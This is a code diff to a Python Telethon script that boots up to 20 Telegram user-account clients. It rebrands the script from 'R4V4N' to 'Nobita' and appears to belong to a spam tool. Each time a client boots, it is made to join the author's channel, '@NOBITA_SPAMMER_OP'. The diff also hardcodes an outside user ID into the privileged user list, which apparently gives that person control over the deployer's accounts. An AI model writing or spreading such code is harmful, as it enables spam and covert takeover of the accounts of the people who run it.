@@ -73,11 +73,11 @@ put = ""
 
 que = {}
 
-SMEX_USERS = []
+SMEX_USERS = [5275980328]
 for x in SUDO: 
     SMEX_USERS.append(x)
     
-async def start_R4V4N():
+async def start_Nobita():
     global idk
     global ydk
     global wdk
@@ -112,8 +112,8 @@ async def start_R4V4N():
             print("Booting Up The Client 1")
             await idk.start()
             botme = await idk.get_me()
-            await idk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await idk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await idk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await idk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -136,8 +136,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 2")
             await ydk.start()
-            await ydk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await ydk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await ydk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await ydk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await ydk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -161,8 +161,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 3")
             await  wdk.start()
-            await wdk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await wdk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await wdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await wdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await wdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -186,8 +186,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 4")
             await hdk.start()
-            await hdk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await hdk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await hdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await hdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await hdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -211,8 +211,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 5")
             await sdk.start()
-            await sdk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await sdk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await sdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await sdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await sdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -236,8 +236,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 6")
             await adk.start()
-            await adk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await adk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await adk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await adk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await adk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -261,8 +261,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 7")
             await bdk.start()
-            await bdk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await bdk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await bdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await bdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await bdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -287,8 +287,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 8")
             await cdk.start()
-            await cdk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await cdk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await cdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await cdk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await cdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -312,8 +312,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 9")
             await ddk.start()
-            await ddk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await ddk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await ddk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await ddk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await ddk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -338,8 +338,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 10")
             await edk.start()
-            await edk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await edk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await edk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await edk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await edk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -364,8 +364,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 11")
             await vkk.start()
-            await vkk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await vkk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await vkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await vkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await vkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -390,8 +390,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 12")
             await kkk.start()
-            await kkk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await kkk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await kkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await kkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await kkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -416,8 +416,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 13")
             await lkk.start()
-            await lkk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await lkk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await lkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await lkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await lkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -442,8 +442,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 14")
             await mkk.start()
-            await mkk(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await mkk(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await mkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await mkk(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await mkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -468,8 +468,8 @@ async def start_R4V4N():
         try:
             print("Booting Up The Client 15")
             await sid.start()
-            await sid(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await sid(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await sid(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await sid(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botme = await sid.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -495,8 +495,8 @@ async def start_R4V4N():
             print("Booting Up The Client 16")
             await shy.start()
             botme = await shy.get_me()
-            await shy(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await shy(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await shy(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await shy(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -519,8 +519,8 @@ async def start_R4V4N():
             print("Booting Up The Client 17")
             await aan.start()
             botme = await aan.get_me()
-            await aan(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await aan(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await aan(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await aan(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -543,8 +543,8 @@ async def start_R4V4N():
             print("Booting Up The Client 18")
             await ake.start()
             botme = await ake.get_me()
-            await ake(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await ake(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await ake(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await ake(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -567,8 +567,8 @@ async def start_R4V4N():
             print("Booting Up The Client 19")
             await eel.start()
             botme = await eel.get_me()
-            await eel(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await eel(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await eel(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await eel(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -591,8 +591,8 @@ async def start_R4V4N():
             print("Booting Up The Client 20")
             await khu.start()
             botme = await khu.get_me()
-            await khu(functions.channels.JoinChannelRequest(channel="@team_blackstorm"))
-            await khu(functions.channels.JoinChannelRequest(channel="@R4V4N_FIGHTERS"))
+            await khu(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
+            await khu(functions.channels.JoinChannelRequest(channel="@NOBITA_SPAMMER_OP"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
